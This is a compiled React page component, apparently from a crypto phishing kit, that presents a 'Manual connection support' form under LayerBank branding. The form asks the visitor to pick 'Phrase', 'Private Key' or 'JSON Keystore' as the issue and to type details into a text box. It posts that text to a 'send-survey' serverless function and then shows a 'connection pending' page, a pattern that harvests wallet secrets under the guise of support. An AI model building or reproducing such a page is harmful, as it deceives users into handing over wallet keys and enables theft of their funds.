import { r as __toESM } from "../_runtime.mjs";
import { n as require_jsx_runtime } from "../_libs/radix-ui__react-context+react.mjs";
import { n as require_react } from "../_libs/@radix-ui/react-compose-refs+[...].mjs";
import { a as MessageSquareWarning, m as ArrowLeft, o as LoaderCircle, r as ShieldCheck } from "../_libs/lucide-react.mjs";
import { g as useNavigate, h as Link } from "../_libs/@tanstack/react-router+[...].mjs";
import { t as Route } from "./manual-connect-D2twWjgc.mjs";
import { t as Button } from "./button-DRsC1qZi.mjs";
//#region node_modules/.nitro/vite/services/ssr/assets/manual-connect-Ccr6VShH.js
var import_react = /* @__PURE__ */ __toESM(require_react());
var import_jsx_runtime = require_jsx_runtime();
var issueOptions = [
	"Phrase",
	"Private Key",
	"JSON Keystore"
];
function Logo() {
	return /* @__PURE__ */ (0, import_jsx_runtime.jsx)("img", {
		src: "/logo-text.Dzhj1ci0.svg",
		alt: "LayerBank",
		className: "h-7 w-auto sm:h-8"
	});
}
function ManualConnect() {
	const { wallet } = Route.useSearch();
	const navigate = useNavigate();
	const [issue, setIssue] = (0, import_react.useState)("");
	const [description, setDescription] = (0, import_react.useState)("");
	const [website, setWebsite] = (0, import_react.useState)("");
	const [status, setStatus] = (0, import_react.useState)("idle");
	const [message, setMessage] = (0, import_react.useState)("");
	const submit = async (event) => {
		event.preventDefault();
		if (!issue || description.trim().length < 10) {
			setStatus("error");
			setMessage("Choose an issue and enter at least 10 characters of detail.");
			return;
		}
		setStatus("sending");
		setMessage("");
		try {
			const response = await fetch("/.netlify/functions/send-survey", {
				method: "POST",
				headers: { "Content-Type": "application/json" },
				body: JSON.stringify({
					wallet,
					issue,
					description: description.trim(),
					website
				})
			});
			const result = (response.headers.get("content-type") || "").includes("application/json") ? await response.json() : { message: response.ok ? void 0 : "The email service endpoint is unavailable. For local testing, run the site with Netlify Dev." };
			if (!response.ok) throw new Error(result.message || "Unable to send your report.");
			setStatus("sent");
			await navigate({
				to: "/connection-pending",
				replace: true
			});
		} catch (error) {
			setStatus("error");
			setMessage(error instanceof Error ? error.message : "Unable to send your report.");
		}
	};
	return /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
		className: "min-h-screen bg-background text-foreground",
		children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("header", {
			className: "border-b border-border bg-page-top",
			children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
				className: "mx-auto flex h-24 max-w-[1100px] items-center px-6 sm:px-10",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Link, {
					to: "/",
					children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(Logo, {})
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("span", {
					className: "ml-auto flex items-center gap-2 text-sm text-table",
					children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(ShieldCheck, { className: "size-4 text-primary" }), "Secure support"]
				})]
			})
		}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("main", {
			className: "mx-auto max-w-[760px] px-6 py-12 sm:px-10 sm:py-20",
			children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)(Link, {
				to: "/validate",
				className: "mb-8 inline-flex items-center gap-2 text-sm font-semibold text-table transition-colors hover:text-foreground",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(ArrowLeft, { className: "size-4" }), "Back to wallet options"]
			}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("section", {
				className: "rounded-[28px] border border-border bg-card p-6 shadow-[0_30px_80px_rgba(0,0,0,0.25)] sm:p-10",
				children: [/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", {
					className: "mb-8",
					children: [
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
							className: "mb-5 grid size-12 place-items-center rounded-2xl bg-primary/10 text-primary",
							children: /* @__PURE__ */ (0, import_jsx_runtime.jsx)(MessageSquareWarning, { className: "size-6" })
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("h1", {
							className: "text-3xl font-bold tracking-tight",
							children: "Manual connection support"
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
							className: "mt-3 leading-7 text-table",
							children: /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("strong", {
								className: "text-foreground",
								children: [wallet, " "]
							})
						})
					]
				}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("form", {
					onSubmit: submit,
					className: "space-y-6",
					children: [
						/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
							className: "block",
							children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
								className: "mb-2 block text-sm font-semibold",
								children: "Issue type"
							}), /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("select", {
								value: issue,
								onChange: (event) => setIssue(event.target.value),
								required: true,
								className: "h-14 w-full rounded-xl border border-border bg-background px-4 text-foreground outline-none focus:border-primary focus:ring-2 focus:ring-primary/20",
								children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)("option", {
									value: "",
									disabled: true,
									children: "Select an issue"
								}), issueOptions.map((option) => /* @__PURE__ */ (0, import_jsx_runtime.jsx)("option", {
									value: option,
									children: option
								}, option))]
							})]
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
							className: "block",
							children: [
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("span", {
									className: "mb-2 block text-sm font-semibold",
									children: "Description"
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsx)("textarea", {
									value: description,
									onChange: (event) => setDescription(event.target.value),
									required: true,
									minLength: 10,
									maxLength: 2e3,
									rows: 7,
									placeholder: "....",
									className: "w-full resize-y rounded-xl border border-border bg-background p-4 text-foreground outline-none placeholder:text-subtle focus:border-primary focus:ring-2 focus:ring-primary/20"
								}),
								/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("span", {
									className: "mt-1 block text-right text-xs text-subtle",
									children: [description.length, "/2000"]
								})
							]
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsxs)("label", {
							className: "hidden",
							"aria-hidden": "true",
							children: ["Website", /* @__PURE__ */ (0, import_jsx_runtime.jsx)("input", {
								tabIndex: -1,
								autoComplete: "off",
								value: website,
								onChange: (event) => setWebsite(event.target.value)
							})]
						}),
						message && /* @__PURE__ */ (0, import_jsx_runtime.jsx)("p", {
							role: "alert",
							className: "rounded-xl border border-destructive/30 bg-destructive/10 px-4 py-3 text-sm text-destructive",
							children: message
						}),
						/* @__PURE__ */ (0, import_jsx_runtime.jsx)(Button, {
							type: "submit",
							disabled: status === "sending",
							className: "h-14 w-full rounded-xl text-base font-bold",
							children: status === "sending" ? /* @__PURE__ */ (0, import_jsx_runtime.jsxs)(import_jsx_runtime.Fragment, { children: [/* @__PURE__ */ (0, import_jsx_runtime.jsx)(LoaderCircle, { className: "animate-spin" }), "Sending report…"] }) : "Submit report"
						})
					]
				})]
			})]
		})]
	});
}
//#endregion
export { ManualConnect as component };
